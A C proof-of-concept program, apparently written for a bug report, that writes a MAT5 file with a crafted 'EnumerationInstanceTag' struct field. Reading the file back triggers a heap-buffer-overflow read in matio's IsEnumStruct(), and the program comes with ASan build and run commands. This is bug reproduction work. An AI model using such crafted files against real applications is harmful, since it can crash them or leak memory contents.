/*
 * PoC for a heap-buffer-overflow read in IsEnumStruct() (src/mcos.c).
 *
 * Writes a MAT5 file containing a single struct variable with a field named
 * "EnumerationInstanceTag" that holds a two-element uint32 array whose first
 * element does not match the MCOS marker value. Mat_VarReadNext() then drives
 * the library's automatic enumeration-struct detection, which scans past the
 * end of the tag's data buffer.
 *
 * Build (ASan):
 *   cc -fsanitize=address -g -O0 -I/work/src newbug.c -L/work/build-asan -lmatio -o newbug \
 *     -Wl,-rpath,/work/build-asan
 * Run:
 *   ./newbug /tmp/newbug.mat
 */
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>

int
main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1] : "/tmp/newbug.mat";
    mat_t *mat;
    matvar_t *matvar;
    matvar_t *tag;
    size_t dims[2];
    mat_uint32_t tag_data[2];
    const char *fields[2] = {"EnumerationInstanceTag", NULL};

    tag_data[0] = 0x11111111U; /* not the MCOS marker value */
    tag_data[1] = 0x22222222U;

    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT5);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_CreateVer failed\n");
        return 1;
    }

    dims[0] = 1;
    dims[1] = 1;
    matvar = Mat_VarCreateStruct2("s", 2, dims, fields);
    if ( matvar == NULL ) {
        fprintf(stderr, "Mat_VarCreateStruct2 failed\n");
        return 1;
    }

    dims[0] = 1;
    dims[1] = 2;
    tag = Mat_VarCreate("EnumerationInstanceTag", MAT_C_UINT32, MAT_T_UINT32, 2, dims, tag_data, 0);
    if ( tag == NULL ) {
        fprintf(stderr, "Mat_VarCreate failed\n");
        return 1;
    }
    Mat_VarSetStructFieldByName(matvar, "EnumerationInstanceTag", 0, tag);

    if ( Mat_VarWrite(mat, matvar, MAT_COMPRESSION_NONE) != 0 ) {
        fprintf(stderr, "Mat_VarWrite failed\n");
        return 1;
    }
    Mat_VarFree(matvar);
    Mat_Close(mat);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 1;
    }

    matvar = Mat_VarReadNext(mat); /* triggers the OOB read via Mat_MCOS_ReadEnum */
    Mat_VarFree(matvar);
    Mat_Close(mat);

    printf("done\n");
    return 0;
}
